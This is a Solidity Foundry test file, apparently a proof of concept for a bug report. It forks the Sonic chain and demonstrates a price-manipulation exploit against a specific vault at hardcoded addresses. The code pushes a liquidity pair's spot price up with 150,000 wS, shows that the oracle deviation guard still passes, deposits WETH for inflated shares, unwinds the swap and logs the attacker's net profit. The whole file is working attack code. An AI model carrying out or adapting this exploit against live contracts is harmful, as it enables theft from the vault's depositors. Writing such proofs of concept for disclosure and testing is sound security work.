// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;
import "forge-std/Test.sol";
interface IERC20 { function balanceOf(address) external view returns(uint256); function transfer(address,uint256) external returns(bool); function approve(address,uint256) external returns(bool);}
interface IWNative { function deposit() external payable; }
interface IVault {
    function previewShares(uint256,uint256) external view returns(uint256,uint256,uint256);
    function previewAmounts(uint256) external view returns(uint256,uint256);
    function totalSupply() external view returns(uint256);
    function deposit(uint256,uint256,uint256) external returns(uint256,uint256,uint256);
}
interface IOracleHelper { function getPrice() external view returns(uint256); function checkPriceInDeviation() external view returns(bool);}
interface ILBPair { function getActiveId() external view returns(uint24); function swap(bool,address) external returns(bytes32);}

contract PoC is Test {
    address constant VAULT=0x6bE5a84D4A92269eC0Eb228B6c4dAdecED4C7D54;
    address constant PAIR=0x9eDE606c7168bb09fF73EbdE7bFD6FcfaBDA9Bc3;
    address constant WETH=0x50c42dEAcD8Fc9773493ED674b675bE577f2634b;
    address constant WS=0x039e2fB66102314Ce7b64Ce5Ce3E5183bc94aD38;
    address constant OH=0x01c871DfFC36eDC4dDf86FB4a9Bc690B3613a80f;
    IVault v=IVault(VAULT); ILBPair p=ILBPair(PAIR); address atk=address(0xA11CE);
    uint256 Ptrue;
    function setUp() public { vm.createSelectFork("sonic",78400000); Ptrue=IOracleHelper(OH).getPrice(); }
    function pxScaled() internal view returns(uint256){ return (IOracleHelper(OH).getPrice()*1e6)>>128; }
    function valWs(uint256 w,uint256 y) internal view returns(uint256){ return ((Ptrue*w)>>128)+y; }

    function testPoC() public {
        uint256 MWS=150_000e18;      // manipulation capital
        uint256 DWETH=1000e18;       // deposit capital (recoverable)
        emit log_string("=== BASELINE (honest) ===");
        emit log_named_uint("oracle_price_wSperWETH_1e6", pxScaled());
        emit log_named_uint("activeId", p.getActiveId());
        (uint256 honestShares,,)=v.previewShares(DWETH,0);
        emit log_named_uint("honest_shares_for_1000WETH", honestShares);

        // fund
        vm.deal(atk,MWS); vm.startPrank(atk); IWNative(WS).deposit{value:MWS}(); vm.stopPrank();
        deal(WETH,atk,DWETH);
        uint256 valBefore=valWs(IERC20(WETH).balanceOf(atk),IERC20(WS).balanceOf(atk));
        emit log_named_uint("attacker_value_before_wS", valBefore);

        vm.startPrank(atk);
        // 1) manipulate UP
        uint256 wb=IERC20(WETH).balanceOf(atk);
        IERC20(WS).transfer(PAIR,MWS); p.swap(false,atk);
        uint256 bought=IERC20(WETH).balanceOf(atk)-wb;
        emit log_string("=== AFTER MANIPULATION (spot pushed up) ===");
        emit log_named_uint("oracle_price_wSperWETH_1e6", pxScaled());
        emit log_named_uint("activeId", p.getActiveId());
        emit log_named_string("guard_checkPriceInDeviation", IOracleHelper(OH).checkPriceInDeviation()?"PASS":"FAIL");
        (uint256 manipShares,,)=v.previewShares(DWETH,0);
        emit log_named_uint("manip_shares_for_1000WETH", manipShares);
        emit log_named_uint("share_inflation_bps", (manipShares-honestShares)*10000/honestShares);

        // 2) deposit WETH at inflated price
        IERC20(WETH).approve(VAULT,DWETH);
        uint256 g0=gasleft();
        (uint256 shares,,)=v.deposit(DWETH,0,0);
        uint256 gasDep=g0-gasleft();
        // 3) unwind
        IERC20(WETH).transfer(PAIR,bought); p.swap(true,atk);
        vm.stopPrank();

        emit log_string("=== AFTER UNWIND (price restored) ===");
        emit log_named_uint("oracle_price_wSperWETH_1e6", pxScaled());
        (uint256 rx,uint256 ry)=v.previewAmounts(shares);
        emit log_named_uint("redeemable_WETH", rx);
        emit log_named_uint("redeemable_wS", ry);
        uint256 valAfter=valWs(IERC20(WETH).balanceOf(atk),IERC20(WS).balanceOf(atk))+valWs(rx,ry);
        emit log_named_uint("attacker_value_after_wS", valAfter);
        emit log_named_int("NET_PROFIT_wS", int256(valAfter)-int256(valBefore));
        emit log_named_uint("gas_deposit", gasDep);
    }
}
